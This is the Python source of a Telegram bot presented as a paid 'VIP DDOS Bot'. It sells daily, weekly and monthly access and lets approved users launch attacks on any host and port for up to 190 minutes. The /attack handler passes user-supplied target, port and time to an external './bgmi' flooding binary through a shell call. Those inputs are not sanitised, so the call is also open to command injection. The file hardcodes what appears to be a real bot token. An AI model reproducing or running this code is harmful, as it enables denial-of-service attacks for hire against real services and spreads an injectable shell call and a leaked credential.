#!/usr/bin/python3

import telebot
import subprocess
import datetime
import os
import logging

# Configure logging
logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Insert your Telegram bot token here
bot = telebot.TeleBot('7754295571:AAH0jLwl-jllwHmrhJfjLl39J0PERvZYUBk')
# Owner and admin user IDs
owner_id = "6281757332"
admin_ids = ["ADMIN_USER_ID1", "ADMIN_USER_ID2"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Dictionary to store free user credits
free_user_credits = {}

# Key prices for different durations
key_prices = {
    "day": 80,
    "week": 399,
    "month": 800
}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return [line.split()[0] for line in file.readlines()]
    except FileNotFoundError:
        return []

# Read allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, duration):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, duration=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if duration:
        log_entry += f" | Time: {duration}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to get current time
def get_current_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    response = (
        f"🌟 **Welcome to the VIP DDOS Bot!** 🌟\n\n"
        f"⏰ **Current Time:** {get_current_time()}\n\n"
        "Here are the commands you can use:\n"
        "✅ **/attack <host> <port> <time>** – Start an attack on the target\n\n"
        "⚠️ **Important:** Use this tool responsibly and only for legal purposes!\n\n"
        "💬 Contact Admin if you need assistance or further details.\n"
        "🔑 **To gain access**, contact an Admin or the Owner for approval. 💌"
    )
    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['approveuser'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            user_to_approve = command[1]
            duration = command[2]
            if duration not in key_prices:
                response = "❌ **Invalid duration!** Please use 'day', 'week', or 'month'."
                bot.send_message(message.chat.id, response)
                return

            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "day" else 7 if duration == "week" else 30)
            allowed_user_ids.append(user_to_approve)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_to_approve} {expiration_date}\n")
            
            response = f"✅ **User {user_to_approve} approved for {duration}!** 🎉"
        else:
            response = "⚠️ **Usage:** /approveuser <id> <duration>"
    else:
        response = "❌ **Only Admins or the Owner can approve users!** 😡"
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user in allowed_user_ids:
                        file.write(f"{user}\n")
                response = f"🗑️ **User {user_to_remove} removed successfully!** ✅"
            else:
                response = f"❌ **User {user_to_remove} not found!**"
        else:
            response = "⚠️ **Usage:** /removeuser <id>"
    else:
        response = "❌ **Only Admins or the Owner can remove users!** 😡"
    bot.send_message(message.chat.id, response)

# Function to handle the reply when free users run the /attack command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    response = (
        f"🚀 **Attack Sent Successfully!** 🚀\n\n"
        f"🎯 **Target:** {target}:{port}\n"
        f"⏳ **Duration:** {time} minutes\n"
        f"🔥 **Status:** Attack in Progress... 🔥"
    )
    bot.reply_to(message, response)

# Handler for /attack command and direct attack input
@bot.message_handler(func=lambda message: message.text and (message.text.startswith('/attack') or not message.text.startswith('/')))
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        command = message.text.split()
        if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
            if not message.text.startswith('/'):
                command = ['/attack'] + command  # Prepend '/attack' to the command list
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 190:
                response = "❌ **Error:** Time interval must be less than 190 minutes."
            else:
                record_command_logs(user_id, target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
                full_command = f"./bgmi {target} {port} {time}"
                subprocess.run(full_command, shell=True)
                response = f"🎯 **Attack Finished!**\nTarget: {target}\nPort: {port}\nDuration: {time} minutes"
        else:
            response = "**Error:** Please provide the attack in the following format: ` <host> <port> <time>`"
    else:
        response = (
            "❌ **Unauthorized Access!** 🚫\n\n"
            "It seems you don't have permission to use the /attack command.\n"
            "🔑 **To gain access**, contact an Admin or the Owner for approval. 💌"
        )

    bot.reply_to(message, response)

# Start the bot
bot.polling()
